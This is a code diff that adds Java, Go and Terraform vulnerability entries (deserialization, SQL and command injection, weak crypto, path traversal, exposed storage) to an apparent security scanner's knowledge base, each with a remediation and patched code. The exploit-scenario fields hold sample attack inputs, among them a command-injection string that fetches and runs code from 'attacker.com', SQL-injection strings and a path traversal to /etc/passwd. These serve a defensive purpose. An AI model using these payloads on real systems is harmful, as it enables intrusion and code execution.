@@ -271,6 +271,84 @@ EXPERT_KNOWLEDGE_BASE: Dict[str, Dict[str, str]] = {
         "remediation_strategy": "Set readOnlyRootFilesystem: true and provide emptyDir volumes for specific temporary scratch folders (/tmp).",
         "patched_code": "securityContext:\n  readOnlyRootFilesystem: true",
     },
+    "SAST-JAVA-001": {
+        "analysis": "Java ObjectInputStream.readObject() deserializes untrusted byte streams, executing arbitrary bytecode via gadget chains (CWE-502).",
+        "exploit_scenario": "Using tools like ysoserial, an attacker sends a serialized payload (e.g., CommonsCollections gadget) to execute arbitrary commands as the JVM process.",
+        "remediation_strategy": "Never deserialize untrusted byte streams using Java native serialization. Migrate to JSON (Jackson/Gson) with safe typing.",
+        "patched_code": "ObjectMapper mapper = new ObjectMapper();\nMyData data = mapper.readValue(jsonStream, MyData.class);",
+    },
+    "SAST-JAVA-002": {
+        "analysis": "Dynamic string concatenation in JDBC executeQuery() or JPA createNativeQuery() causes SQL Injection (CWE-89).",
+        "exploit_scenario": "Attacker supplies `' OR '1'='1` in the input parameter to bypass authentication and dump the database tables.",
+        "remediation_strategy": "Use PreparedStatement with parameterized '?' placeholders.",
+        "patched_code": "PreparedStatement stmt = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\");\nstmt.setString(1, userId);",
+    },
+    "SAST-JAVA-003": {
+        "analysis": "Runtime.getRuntime().exec() or ProcessBuilder with dynamic user arguments allows OS Command Injection (CWE-78).",
+        "exploit_scenario": "An attacker appends `; curl attacker.com/malware | sh` to an argument to gain interactive shell access on the host.",
+        "remediation_strategy": "Avoid invoking shell interpreters. Pass structured argument arrays and validate inputs against strict allowlists.",
+        "patched_code": "ProcessBuilder pb = new ProcessBuilder(Arrays.asList(\"/usr/bin/safe-cmd\", validatedArg));",
+    },
+    "SAST-JAVA-004": {
+        "analysis": "Broken cryptographic algorithms (DES, RC4, MD5, SHA-1) in Java (CWE-327).",
+        "exploit_scenario": "DES 56-bit keys can be cracked in hours; MD5 hash collisions allow signature forgery.",
+        "remediation_strategy": "Use AES-GCM with 256-bit keys for encryption and SHA-256 for hashing.",
+        "patched_code": "Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");",
+    },
+    "SAST-JAVA-005": {
+        "analysis": "Path Traversal in Java file operations (CWE-22).",
+        "exploit_scenario": "Input `../../../../etc/passwd` allows reading sensitive system configuration files.",
+        "remediation_strategy": "Resolve paths against canonical base directory and verify using Path.startsWith().",
+        "patched_code": "Path target = baseDir.resolve(userInput).normalize();\nif (!target.startsWith(baseDir)) throw new SecurityException(\"Invalid path\");",
+    },
+    "SAST-JAVA-006": {
+        "analysis": "Hardcoded secret or private key in Java source file (CWE-798).",
+        "exploit_scenario": "Committed source code exposes authentication tokens, leading to unauthorized account or API compromise.",
+        "remediation_strategy": "Read secrets from environment variables or a vault at runtime.",
+        "patched_code": "String secret = System.getenv(\"API_SECRET_KEY\");",
+    },
+    "SAST-GO-001": {
+        "analysis": "SQL Injection in Go database/sql via fmt.Sprintf or concatenation (CWE-89).",
+        "exploit_scenario": "Input `admin' --` bypasses password check in SQL authentication query.",
+        "remediation_strategy": "Use parameterized queries with placeholder arguments ($1, ?).",
+        "patched_code": "row := db.QueryRow(\"SELECT * FROM users WHERE id = $1\", userId)",
+    },
+    "SAST-GO-002": {
+        "analysis": "Command Injection in Go exec.Command with shell invocation (CWE-78).",
+        "exploit_scenario": "Unsanitized user input passed to `sh -c` executes chained commands via semicolon or pipes.",
+        "remediation_strategy": "Call the target binary directly with discrete arguments without invoking a shell.",
+        "patched_code": "cmd := exec.Command(\"ping\", \"-c\", \"1\", validatedHost)",
+    },
+    "SAST-GO-003": {
+        "analysis": "Insecure TLS verification with InsecureSkipVerify: true (CWE-295).",
+        "exploit_scenario": "Attackers perform Man-In-The-Middle (MITM) attacks to decrypt or manipulate TLS network traffic.",
+        "remediation_strategy": "Set InsecureSkipVerify: false and load trusted root certificates.",
+        "patched_code": "tlsConfig := &tls.Config{ InsecureSkipVerify: false }",
+    },
+    "SAST-GO-004": {
+        "analysis": "Weak cryptographic hashing algorithm (MD5/SHA1/DES) in Go (CWE-327).",
+        "exploit_scenario": "Collisions in MD5/SHA-1 allow attackers to forge valid digital signatures.",
+        "remediation_strategy": "Migrate to crypto/sha256 or crypto/aes.",
+        "patched_code": "h := sha256.New()",
+    },
+    "IAC-TF-001": {
+        "analysis": "Terraform public S3 bucket ACL (public-read or public-read-write) (CWE-284).",
+        "exploit_scenario": "All files, databases dumps, or backups stored in the S3 bucket can be downloaded anonymously by anyone on the internet.",
+        "remediation_strategy": "Set bucket ACL to private and enable aws_s3_bucket_public_access_block.",
+        "patched_code": "resource \"aws_s3_bucket\" \"secure\" {\n  bucket = \"my-secure-bucket\"\n  acl    = \"private\"\n}",
+    },
+    "IAC-TF-002": {
+        "analysis": "Terraform security group ingress open to 0.0.0.0/0 on sensitive ports (SSH/RDP/DB) (CWE-284).",
+        "exploit_scenario": "Internet-wide port scans detect open SSH port 22, launching automated credential stuffing or brute force attacks.",
+        "remediation_strategy": "Restrict ingress CIDR blocks to corporate VPN or specific office IPs.",
+        "patched_code": "cidr_blocks = [\"10.0.0.0/16\"]",
+    },
+    "IAC-TF-003": {
+        "analysis": "Unencrypted cloud storage or database in Terraform configuration (CWE-311).",
+        "exploit_scenario": "Physical drive theft or snapshot exfiltration reveals plaintext customer data.",
+        "remediation_strategy": "Enable KMS server-side encryption at rest (encrypted = true, storage_encrypted = true).",
+        "patched_code": "encrypted = true",
+    },
 }
 
 
